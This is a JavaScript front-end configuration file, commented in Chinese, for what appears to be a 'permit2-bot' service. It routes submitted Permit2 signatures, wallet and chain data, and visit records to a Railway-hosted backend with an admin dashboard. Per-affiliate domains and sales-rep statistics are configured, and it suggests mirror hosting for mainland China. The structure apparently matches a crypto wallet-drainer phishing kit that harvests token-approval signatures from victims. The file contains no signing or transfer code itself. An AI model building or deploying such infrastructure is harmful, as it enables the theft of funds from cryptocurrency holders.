// API Configuration
// 前端 API 配置文件

// 自动检测环境
const isProduction = window.location.hostname === 'labtoken.vercel.app' ||
                   window.location.hostname !== 'localhost' &&
                   window.location.hostname !== '127.0.0.1';

// 国内访问支持配置
const CHINA_ACCESS_CONFIG = {
  // 检测是否在国内
  isChina: () => {
    const hostname = window.location.hostname;
    // 检测国内常见域名
    const chinaDomains = ['.cn', '.com.cn', '.net.cn', '.org.cn', '.gov.cn'];
    return chinaDomains.some(domain => hostname.endsWith(domain)) ||
           hostname.includes('gitee.io') ||
           hostname.includes('coding.net');
  },
  
  // 国内可访问的部署选项
  chinaDeploymentOptions: [
    {
      name: 'Gitee Pages',
      url: 'https://your-username.gitee.io/permit2-index/',
      description: '国内访问速度快，免费'
    },
    {
      name: 'Coding Pages',
      url: 'https://your-username.coding.net/p/permit2-index',
      description: '腾讯云托管，国内访问'
    },
    {
      name: 'Vercel (需要代理)',
      url: 'https://labtoken.vercel.app/',
      description: '需要开启系统代理访问'
    },
    {
      name: '本地服务器',
      url: 'http://localhost:8080/',
      description: '适合开发测试'
    }
  ],
  
  // 显示国内访问提示
  showChinaAccessHelp: () => {
    if (CHINA_ACCESS_CONFIG.isChina()) {
      console.log('🇨🇳 检测到国内访问环境');
      console.log('💡 推荐使用以下部署方式：');
      CHINA_ACCESS_CONFIG.chinaDeploymentOptions.forEach((option, index) => {
        console.log(`${index + 1}. ${option.name}: ${option.url}`);
        console.log(`   ${option.description}`);
      });
    }
  }
};

// 业务员域名配置（每个业务员一个域名）
const SALES_REP_DOMAINS = {
  // 格式: '业务员标识': ['域名1', '域名2']
  'agent_001': ['labtoken.vercel.app'],
  // 添加更多业务员域名:
  // 'agent_002': ['subdomain2.yourdomain.com'],
  // 'agent_003': ['subdomain3.yourdomain.com'],
};

// 检测当前业务员
function detectSalesRep() {
  const hostname = window.location.hostname;
  for (const [repId, domains] of Object.entries(SALES_REP_DOMAINS)) {
    if (domains.some(d => hostname === d || hostname.endsWith('.' + d))) {
      return repId;
    }
  }
  return 'default';
}

const currentSalesRep = detectSalesRep();

// API 配置
const API_CONFIG = {
  // API 基础 URL - 根据环境自动切换
  BASE_URL: isProduction 
    ? 'https://permit2-bot-production.up.railway.app/api/v1'  // Railway 后端地址
    : 'http://localhost:8080/api/v1',         // 开发环境
  
  // 或者手动设置（取消注释并替换为您的地址）
  // BASE_URL: 'https://your-server-ip:8080/api/v1',
  // BASE_URL: 'https://api.yourdomain.com/api/v1',
  // BASE_URL: 'https://permit2-bot.onrender.com/api/v1',
  
  // API 端点
  ENDPOINTS: {
    // 签名提交
    SIGNATURE: '/signature',
    BATCH_SIGNATURES: '/batch-signatures',
    
    // 获取信息
    HEALTH: '/health',
    STATS: '/stats',
    WALLETS: '/wallets',
    CHAINS: '/chains',

    // 管理员仪表盘
    ADMIN_LOGIN: '/admin/login',
    ADMIN_LOGOUT: '/admin/logout',
    DASHBOARD: '/dashboard',
    VISIT: '/visit',

    // 业务员统计
    SALES_REP_STATS: '/sales-rep-stats',
    SALES_REPS: '/sales-reps'
  },
  
  // 请求超时（毫秒）
  TIMEOUT: 30000,
  
  // 重试配置
  RETRY: {
    MAX_ATTEMPTS: 3,
    DELAY: 1000
  },
  
  // 环境标识
  isProduction: isProduction,

  // 当前业务员标识
  salesRep: currentSalesRep
};

// 构建完整的 API URL
function buildApiUrl(endpoint) {
  return `${API_CONFIG.BASE_URL}${endpoint}`;
}

// 获取当前 API 地址（用于调试）
function getApiBaseUrl() {
  console.log(`🔧 API Mode: ${isProduction ? 'Production' : 'Development'}`);
  console.log(`🔗 API URL: ${API_CONFIG.BASE_URL}`);
  console.log(`👤 Sales Rep: ${currentSalesRep}`);
  
  // 显示国内访问提示
  CHINA_ACCESS_CONFIG.showChinaAccessHelp();
  
  return API_CONFIG.BASE_URL;
}

// 导出配置
if (typeof module !== 'undefined' && module.exports) {
  module.exports = API_CONFIG;
}